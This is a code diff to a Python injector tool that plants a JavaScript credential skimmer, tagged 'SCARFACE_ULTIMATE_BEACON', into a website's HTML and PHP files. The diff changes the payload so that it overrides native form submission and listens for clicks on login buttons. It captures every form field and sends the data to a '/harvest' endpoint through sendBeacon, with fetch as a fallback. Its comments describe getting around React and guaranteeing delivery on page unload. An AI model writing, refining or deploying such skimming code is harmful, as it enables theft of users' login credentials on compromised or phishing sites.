@@ -1,5 +1,5 @@
 """
-Ultimate React-Proof Injector
+Ultimate Beacon Injector - Guarantees delivery on page reload
 """
 import os
 import re
@@ -12,7 +12,7 @@ class ModernInjector:
         self.injection_stats = {'html_files': 0, 'php_files': 0, 'failed': 0}
         
     def inject_all(self):
-        print(f"[*] Starting React-Proof injection for {self.site_name}")
+        print(f"[*] Starting Ultimate Beacon injection for {self.site_name}")
         js_payload = self._generate_payload()
         self._inject_html(js_payload)
         self._inject_php()
@@ -21,75 +21,60 @@ class ModernInjector:
     
     def _generate_payload(self):
         return """
-<!-- SCARFACE_REACT_PROOF -->
+<!-- SCARFACE_ULTIMATE_BEACON -->
 <script>
 (function() {
-    let hooked = false;
-    console.log('[SCARFACE] React-proof loaded');
+    console.log('[SCARFACE] Ultimate beacon loaded');
 
     function captureData(form) {
         if(!form) return;
         var data = {};
-        var elements = form.elements;
-        for(var i=0; i<elements.length; i++){
-            var el = elements[i];
+        for(var i=0; i<form.elements.length; i++){
+            var el = form.elements[i];
             if(el.name && el.value !== undefined && el.type !== 'submit' && el.type !== 'button') {
                 data[el.name] = el.value;
             }
         }
-        
-        if(Object.keys(data).length === 0) {
-            console.log('[SCARFACE] No data found');
-            return;
-        }
+        if(Object.keys(data).length === 0) return;
 
-        console.log('[SCARFACE] ✅ CAPTURED CREDENTIALS:', data);
+        console.log('[SCARFACE] ✅ CAPTURED:', data);
         
-        fetch('/harvest', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(data),
-            keepalive: true
-        }).then(r => r.json())
-          .then(d => console.log('[SCARFACE] Server response:', d))
-          .catch(e => console.log('[SCARFACE] Beacon error:', e));
+        // Guaranteed delivery on page unload
+        var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+        if(navigator.sendBeacon('/harvest', blob)) {
+            console.log('[SCARFACE] Beacon sent successfully');
+        } else {
+            // Fallback to fetch
+            fetch('/harvest', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).catch(e => console.log('[SCARFACE] Fetch error:', e));
+        }
     }
 
-    function findAndHook() {
-        if(hooked) return; // Prevent infinite spam!
-        
-        // Target the real "Log in" button
-        var btn = document.querySelector('button, div[role="button"], input[type="submit"]');
-        if(!btn) return;
+    // Override native form submit (catches direct JS submits)
+    var originalSubmit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function() {
+        captureData(this);
+        originalSubmit.call(this);
+    };
 
-        var text = (btn.textContent || btn.value || '').toLowerCase().trim();
-        if(text.includes('log in') || text.includes('login')) {
-            // Bypass React's event listening by overriding the native onclick directly
-            btn.onclick = function(e) {
-                var form = document.querySelector('form');
+    // Catch button clicks (bypasses React/AJAX)
+    document.addEventListener('click', function(e) {
+        var btn = e.target.closest('button, div[role="button"], input[type="submit"]');
+        if(btn) {
+            var text = (btn.textContent || btn.value || '').toLowerCase().trim();
+            if(text.includes('log in') || text.includes('login') || text.includes('sign in')) {
+                var form = btn.closest('form') || document.querySelector('form');
                 if(form) {
-                    console.log('[SCARFACE] Click intercepted!');
                     captureData(form);
                 }
-                // Returning true allows React's own click handler to still run (so it shows the "Wrong password" error)
-                return true; 
-            };
-            
-            hooked = true;
-            console.log('[SCARFACE] Successfully hooked Login Button!');
+            }
         }
-    }
+    }, true);
 
-    // Run immediately
-    findAndHook();
-    
-    // Run once on DOM change, then stop (so it doesn't spam the console)
-    var observer = new MutationObserver(function() {
-        if(!hooked) {
-            findAndHook();
-        }
-    });
-    observer.observe(document.body, {childList: true, subtree: true});
+    console.log('[SCARFACE] Ready');
 })();
 </script>
 """
@@ -164,7 +149,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
                         with open(php_file, 'r', encoding='utf-8') as f:
                             content = f.read()
                         
-                        if 'SCARFACE_REACT_PROOF' in content:
+                        if 'SCARFACE_ULTIMATE_BEACON' in content:
                             continue
                         
                         strpos = content.find('<?php')
